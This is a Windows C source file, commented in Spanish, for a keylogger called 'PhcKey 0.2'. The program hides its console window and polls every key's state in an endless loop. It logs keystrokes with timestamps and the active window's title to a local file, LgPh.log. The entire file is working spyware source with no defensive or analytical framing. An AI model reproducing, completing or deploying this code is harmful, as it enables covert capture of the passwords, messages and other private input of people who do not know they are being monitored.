

/*cabeceras*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>


FILE *log;

#define OK -32767

HWND ventana;

/*==============================================================
==============================================================*/
void main(int argc, char *argv[])
{
	
	void KeyLogger();

	
	ventana=GetForegroundWindow();
	ShowWindow(ventana,SW_HIDE);

	
	log=fopen("LgPh.log","a");

	
	fprintf(log,"\n------------------------------------\n");
	fprintf(log,"[+] PhcKey 0.2 Log");
	fprintf(log,"\n[+] Iniciando keyloguer...");
	fclose(log);

	KeyLogger();
}



void KeyLogger()
{

	time_t ltime;
	int tecla=0;

	char TVentana[500]; 

	char *Teclas;
	int k; //para recorrer el c�digo ascii de las letras
	//el abecedario (reemplazamos el codigo ascii x la tecla seg�n su posicion, para no crear 25 entradas en el switch)
	char dominio[] = "abcdefghijklmnopqrstuvwxyz";
	//idem
	char dominio_num[] = "0123456789"; //para escanear el numpad

	//limpiamos el buffer del teclado para no mezclar
	fflush(stdin);

	/*comenzamos a loguear*/
	log=fopen("LgPh.log","a");
	fprintf(log,"OK\n");
	fclose(log);

	//cojemos el hwnd de la ventana activa
	ventana=GetForegroundWindow();

	//guardamos la memoria
	Teclas=calloc(1024,sizeof(char));
	//mientras la variable 'loguea' sea TRUE
	do
	{
		/*MIRAMOS SI HA CAMBIADO DE VENTANA PARA GUARDAR LOS DATOS*/
		if(GetForegroundWindow()!=ventana) //si ha cambiado la ventana
		{
			if(strlen(TVentana)>0 && strlen(Teclas)>0) //si hay datos suficientes para loguear
			{
				//cojemos la hora
				time(&ltime);
				ctime(&ltime);

				//como ha cambiado laventana, guardamos los datos
				log=fopen("LgPh.log","a");
				fprintf(log,"\n\n[+] Fecha: %s",ctime(&ltime)); //metemos la hora
				fprintf(log,"[-] [ Ventana: %s ]",TVentana);
				fprintf(log,"\n    %s",Teclas);//guardamos las teclas
				fclose(log);
				//limpiamos la variable
				free(Teclas);
				Teclas=calloc(1024,sizeof(char));
			}
			//cojemos el nuevo hwnd
			ventana=GetForegroundWindow();
		}else{
			//y ahora cojemos el nuevo texto de la ventana
			GetWindowText(ventana,TVentana,500);
		}

		/*creamos un bucle para saber qu� tecla pulsa*/
		for(tecla=4;tecla<256;tecla++)
		{
			if(GetAsyncKeyState(tecla)==OK) //si pulsa una tecla
			{				
				//------------------------------------
				/*ESCANEAMOS BUSCANDO CARACTERES A-Z*/
				//------------------------------------
				for(k=65;k<91;k++)
				{
					if(tecla==k)
					{
						Teclas[strlen(Teclas)]=dominio[tecla-65];
						Teclas[strlen(Teclas)]='\0';
					}
				}

				//-----------------------------------------------
				/*ESCANEAMOS BUSCANDO CARACTERES 0-9 DEL NUMPAD*/
				//-----------------------------------------------
				for(k=96;k<106;k++)
				{
					if(tecla==k)
					{
						Teclas[strlen(Teclas)]=dominio_num[tecla-96];
						Teclas[strlen(Teclas)]='\0';
					}
				}

				//filtramos los caracteres, porque con 'toascii()' se a�aden caracteres a parte
				switch(tecla)
				{
				/*Miramos los "F1,F2..."*/
				case 112:
					strcat(Teclas,"[F1]");
					break;

				case 113:
					strcat(Teclas,"[F2]");
					break;
				
				case 114:
					strcat(Teclas,"[F3]");
					break;

				case 115:
					strcat(Teclas,"[F4]");
					break;

				case 116:
					strcat(Teclas,"[F5]");
					break;

				case 117:
					strcat(Teclas,"[F6]");
					break;

				case 118:
					strcat(Teclas,"[F7]");
					break;

				case 119:
					strcat(Teclas,"[F8]");
					break;

				case 120:
					strcat(Teclas,"[F9]");
					break;

				case 121:
					strcat(Teclas,"[F10]");
					break;

				case 122:
					strcat(Teclas,"[F11]");
					break;

				case 123:
					strcat(Teclas,"[F13]");
					break;

				case 27:
					strcat(Teclas,"[Escape]");
					break;

				case 8:
					strcat(Teclas,"[Retroceso]");
					break;

				case 13:
					strcat(Teclas,"[Enter]");
					break;

				case 9:
					strcat(Teclas,"[Tabulado]");
					break;

				case 20:
					strcat(Teclas,"[Bloq.Mayus.]");
					break;

				case 160:
					strcat(Teclas,"[Shitf(Izq)]");
					break;
				
				case 161:
					strcat(Teclas,"[Shitf(Dcha)]");
					break;

				/*caracteres especiales*/
				case 221:
					Teclas[strlen(Teclas)]='�';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 219:
					strcat(Teclas,"[']");
					break;

				case 192:
					strcat(Teclas,"[�]");
					break;

				case 32:
					strcat(Teclas," ");
					break;

				case 144:
					strcat(Teclas,"[Bloq Num]");
					break;

				case 111:
					Teclas[strlen(Teclas)]='/';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 106:
					Teclas[strlen(Teclas)]='*';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 109:
					Teclas[strlen(Teclas)]='-';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 220:
					Teclas[strlen(Teclas)]='\\';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 49:
					Teclas[strlen(Teclas)]='1';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 50:
					Teclas[strlen(Teclas)]='2';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 51:
					Teclas[strlen(Teclas)]='3';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 52:
					Teclas[strlen(Teclas)]='4';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 53:
					Teclas[strlen(Teclas)]='5';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 54:
					Teclas[strlen(Teclas)]='6';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 55:
					Teclas[strlen(Teclas)]='7';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 56:
					Teclas[strlen(Teclas)]='8';
					Teclas[strlen(Teclas)]='\0';
					break;
				
				case 57:
					Teclas[strlen(Teclas)]='9';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 48:
					Teclas[strlen(Teclas)]='0';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 188:
					Teclas[strlen(Teclas)]=',';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 189:
					Teclas[strlen(Teclas)]='-';
					Teclas[strlen(Teclas)]='\0';
					break;

				case 190:
					Teclas[strlen(Teclas)]='.';
					Teclas[strlen(Teclas)]='\0';
					break;

				default:
					//mostramos el caracter ascii de la tecla pulsada
					//printf("{%d}",tecla);
					break;
				};
			}
		}
	}while(1<2);
}